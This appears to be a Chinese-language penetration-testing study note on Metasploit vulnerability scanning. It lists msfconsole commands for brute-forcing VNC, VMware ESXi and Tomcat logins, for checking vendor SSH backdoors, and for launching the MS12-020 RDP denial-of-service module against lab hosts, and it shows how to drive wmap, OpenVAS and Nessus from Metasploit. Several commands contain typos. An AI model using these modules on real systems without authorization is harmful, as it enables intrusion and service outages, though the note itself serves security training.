msf弱点扫描（即漏洞扫描）

根据信息收集的结果搜索漏洞利用模块

 通过之前的信息收集，已经知道了目的主机提供那些服务，开放那些端口，针对已开放的端口及其对应服务存在哪些安全漏洞的查询过程称为漏洞扫描或者弱点扫描

结合外部漏洞扫描系统对大ip地址段进行批量扫描

 利用插件功能，使用外部漏洞扫描系统，针对漏洞进行扫描，之后再结合msf漏洞利用的功能进行渗透测试

 直接将外部漏洞扫描系统的扫描结果保存在msf中，利用msf本身的漏洞验证、利用功能进行渗透

 msf主要针对漏洞验证和利用，目前仍不具备大范围ip漏洞扫描的功能，所以这一个过程一般仍然使用外部漏洞扫描系统

误判率、漏判率

 所有的扫描均存在误判，可以使用msf来进行验证

实例

 use auxiliary/scanner/vnc/vnc_login

  vnc密码破解

  show option

  set blank_passwords yes

   自动检测空密码

  set pass_file 密码路径

   默认msf提供一个vnc对应密码字典

   保存在/usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt

    该路径下还有msf针对不同服务提供的密码字典

  set rhosts 192.168.1.120

  set thread 30

  run

   破解成功后使用vnc客户端对目的主机进行连接即可获得shell

 ues auxiliary/scanner/vnc/vmc_none_auth

  vnc无密码登录扫描

   有的时候vnc进行配置不当或没有安全配置可能导致vnc无密码即可登录的情况

  show optin

   如果对于目的主机vnc端口没有使用默认的5900，则可能需要进行对rport配置，指定目的主机的vnc端口

  set rhosts 192.168.1.120

  run

 use auxiliary/scanner/rdp/ms12_020_check

  rdp远程桌面漏洞，检查目的主机是否存在该远程桌面漏洞

  show option

   远程桌面的端口是3389

  set rhosts 192.168.1.122, 192.168.1.123

  run

  search ms12-020

  use auxiliary/dos/windows/rdp/ms12_020_maxchannelids

   该模块会导致dos攻击

   auxiliary运行的结果并不会在客户目的主机执行payload，仅仅是影响目的主机的运行或检测目的主机的状态

  info

  show rhost 192.168.1.122

  run

   目的主机蓝屏重启 dos奏效

 use auxiliary/scanner/ssh/juniper_backdoor

  针对juniper防火墙设备其本身使用ssh方式登录的过程存在后门

  set rhosts 192.168.1.122

 use auxiliary/scanner/ssh/fortinet_backdoor

  fortinet设备后门检测

 use auxiliary/scanner/vmware/vmauthd_login

  vmware esxi密码爆破

  set blank_passwords yes

  set rhosts 192.168.1.0/24

  set passfile 密码文件路径

  set username root

  run

  use auxiliary/scanner/vmware/vmware_enum_vms

   之前爆破出用户名和密码之后可以使用该模块列出所有虚拟机

   set rhos 192.168.1.122

   run

 use auxiliary/admin/vmware/poweron_vm

  使用web api远程开启虚拟机

   即在获取了vmware的用户名和密码之后可以使用auxiliary的admin模块对相应虚拟机进行管理

 http弱点扫描

   use auxiliary/scanner/http/cert

   查看目标主机服务器的http服务是否过期

   使用时只要指定rhosts即可

  显示目录及文件

   由于管理员配置不当，导致文件目录被列举出来

   use auxiliary/scanner/http/dir_listing

    show option

    set rhosts 192.168.1.122

    run

     直接从根目录进行查询

     如果知道特定路径，可以在 path选项下进行设置特定路径下进行查找

   use auxiliary/scanner/http/files_dir

    需要指定字典，使用字典中的常见webserver下的文件和目录对目的主机进行查询爆破

    rhosts

    path

    run

  webdav unicode编码身份验证绕过

   use auxiliary/scanner/http/dir_webdav_unicode_bypass

    show option

    rhosts

    run

  tomcat管理页面登录

   use auxiliary/scanner/http/tomcat_mgr_login

   对tomcat(一种web容器)管理页面进行字典暴力破解

   注意在msf配置模块的时候，required选项如果是yes说明该设置是必选的，如果是no说明该选项非必须设置

   rhosts

   run

  基于http方法的身份验证绕过

   使用http的各种请求方法（get post等）尝试进行登录绕过

    rhosts

    run

  wordpress密码爆破

 wmap web应用扫描器

  wmap是msf中的针对web应用的扫描器插件

  load wmap

   在msfconsole在界面中加载wmap

  help

   查看help中多出有关wmap的命令帮助

  wmap_sites -h

   查看该命令具体帮助

  wmap_sites -a http://192.168.1.120

   指定需要进行扫描的站点

  wmap_site -l

   显示目前加入到的目标主机的网址

  wmap_targets -t http://192.168.1.120/mutillidae/index.php

   一个服务器中可能有多个网站，需要指定到底对哪一个网站进行扫描，需要在ip的基础上指定网站的路径

  wmap_run -t

   显示可以使用的具体模块

    这些模块都是maf中的模块

  wmap_run -e

   进行扫描

  wmap_vulns -l

   显示扫描出的结果

 msf与openvas联合使用

  一种基于web的漏洞扫描工具

  load openvas

   在msf中为了使用openvas，加载openvas扫描器插件

    需要使用命令行界面对openvas进行操作，比较繁琐

   本质上是msf作为一个管理工具，连接openvas的接口

  使用openvas的图形化界面进行扫描，然后将结果导出成为nbe格式，将该格式的文件导入msf中进行使用

   db_import 1.nbe

   openvas使用功能的端口包括9391以及9392

    可以直接使用浏览器访问本机9392端口的方式进行使用

 nessus与msf联合使用

  也是用nbe的数据格式对扫描的结果进行保存

  nessus的使用一般也是通过web浏览器来实现，一般安装nessus之后使用浏览器访问本机的8834端口即可使用功能

  load nessus

  nessus _help

   查看加载nessus之后msf多出来的可使用的命令

  nessus_connect -h

  nuessus_connect admin:toor@127.0.0.1

   使用本机的用户名（admin）和密码（toor）登录本机上安装的nessus服务器

  nessus_policy_list

   查看当前nessus服务中存在的扫描策略配置文件

  nessus_scan_new 配置文件的uuid 本次的扫描的名称 本次扫描的描述 目的主机ip地址

  nessus_scan_list

   查看当前的扫描任务

  nessus_scan_launch 扫描任务id

   开始执行进行扫描任务

   nessus_report_list

   显示nessus扫描的报告结果
